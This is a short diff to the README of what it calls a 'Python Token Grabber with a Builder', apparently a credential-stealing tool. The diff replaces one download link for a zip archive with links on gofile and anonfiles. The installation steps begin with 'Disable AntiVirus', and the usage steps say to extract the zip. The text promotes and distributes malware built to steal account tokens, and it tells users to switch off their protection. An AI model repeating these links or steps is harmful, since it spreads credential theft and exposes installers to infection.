@@ -20,7 +20,8 @@ Python Token Grabber with a Builder
 
 ### [+] Installation
  - `Disable AntiVirus`
- - `https://www.mediafire.com/file/x1343fiaigzpnje/Innovatoz.zip/file`
+ - `https://store2.gofile.io/download/3187908b-4ebe-4e73-986c-a5f00ddae47d/Innovatoz.zip`
+ - `https://anonfiles.com/93yfF2daz8/Innovatoz_zip`
 
 ### [+] Usage
  - `Extract the .zip`
